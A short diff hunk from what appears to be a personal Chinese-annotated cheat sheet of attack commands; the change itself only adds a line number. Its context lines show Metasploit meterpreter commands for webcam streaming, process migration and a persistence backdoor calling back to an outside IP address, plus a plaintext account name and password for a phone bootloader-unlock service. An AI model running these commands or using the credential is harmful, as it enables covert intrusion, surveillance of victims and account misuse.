@@ -92,7 +92,7 @@ webcam_stream  网页拍照
 81 run persistence -U -X  -i 5 -p 6789 -r 1.116.58.229 创建隐藏后门
 82 migrate 1416
 83 Account:User_20210714154226 Password:vdvpV1Qk 魅族解锁bl帐号
-
+84 
 
 _______________文件头______________________________________________
 
